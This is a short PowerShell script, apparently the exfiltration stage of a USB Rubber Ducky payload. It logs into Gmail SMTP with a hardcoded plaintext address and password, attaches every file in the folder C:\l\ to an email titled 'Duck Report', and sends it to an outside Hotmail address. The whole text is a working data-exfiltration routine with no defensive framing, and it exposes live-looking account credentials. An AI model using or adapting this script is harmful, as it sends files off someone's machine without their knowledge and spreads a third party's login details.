$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('migapis@gmail.com', 'eternidade');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'migapis@gmail.com'
$ReportEmail.To.Add('migapis@hotmail.com.br')
$ReportEmail.Subject = 'Duck Report'
$ReportEmail.Body = 'Quack Quack' 
$files=Get-ChildItem "C:\l\"
Foreach($file in $files)
{
Write-Host “Attaching File :- ” $file
$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
$ReportEmail.Attachments.Add($attachment)
$SMTPInfo.Send($ReportEmail)
}
write-host "Email enviado com sucesso"
